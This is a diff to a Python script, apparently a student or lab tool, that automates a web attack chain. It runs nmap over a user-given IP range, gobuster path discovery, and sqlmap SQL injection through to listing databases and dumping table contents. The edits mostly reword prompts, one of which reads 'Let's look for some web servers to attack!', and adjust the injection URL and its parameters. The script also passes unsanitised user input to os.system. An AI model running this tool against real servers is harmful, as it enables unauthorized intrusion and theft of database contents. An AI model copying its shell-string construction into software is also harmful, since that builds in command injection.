@@ -42,7 +42,7 @@ if os.geteuid() != 0:
         exit(0)
 
 def nmap_scan():
-    ip_addr = input("Type in the IP range you would like to scan: ")
+    ip_addr = input("\nLet's look for some web servers to attack! \nType in the IP range you would like to scan: ")
     cmd = "nmap -n --open " + ip_addr + " -p80,443"
     try:
         os.system(cmd)
@@ -56,7 +56,7 @@ def nmap_scan():
         print ("nmap scan failed. Run script again.")
     
     #ask user to input a website from the nmap command output. Maybe do a check to ensure that whatever they put was output from the nmap command?
-    webserver = input("Webserver to attack: ")
+    webserver = input("\nNow, let's look for hidden paths in the webserver that could be exploitable!\nType in the webserver you would like to attack: ")
     return webserver
 
 def gobuster(webserver):
@@ -70,20 +70,22 @@ def gobuster(webserver):
         print ("Gobuster failed. Run script again")
 
 def inject_options_output():
-    options = ["id parameter", "option page"]
-    print("Which option would you like to use in SQLMap? Please type the corresponding type number\n")
+    options = ["Exploit vulnerable input parameters", "Exploit form-based SQL Injection"]
+    print("\nWhich option would you like to use in SQLMap?\n")
     counter = 1
     for option in options:
         print(counter, option, "\n")
         counter += 1
+    print("\nPlease type the corresponding type number: ")
 
 def sqlmap(webserver):
-    injection_options = ["?id=1", "NOT available"]
+    injection_options = ["?id=1&Submit=Submit#", "NOT available"]
     hidden_path = input("What hidden path would you like to SQL inject? ")
     inject_options_output()
     option_chosen = int(input())
-    base_cmd = "sqlmap -u " + webserver + hidden_path + injection_options[option_chosen - 1]
+    base_cmd = "sqlmap -u " + "\"" + webserver + hidden_path + "/" + injection_options[option_chosen - 1] + "\""
     cmd = base_cmd + " --dbs"
+    print(cmd)
     try:
         os.system(cmd)
     except KeyboardInterrupt:
@@ -91,7 +93,7 @@ def sqlmap(webserver):
     return base_cmd
 
 def database_search(base_cmd):
-    database = input("What database would you like to attack? ")
+    database = input("Let's look inside the databases. We will start by displaying its tables. \nChoose a database to assess: ")
     cmd = base_cmd + " -D " + database +  " --tables"
     try:
         os.system(cmd)
@@ -100,7 +102,7 @@ def database_search(base_cmd):
     return database
 
 def table_dump(base_cmd, database):
-    table = input("What table would you like to attack? ")
+    table = input("Let's look inside the tables. Choose a table to display its contents: ")
     cmd = base_cmd + " --dump -D " + database +  " -T " + table
     try:
         os.system(cmd)
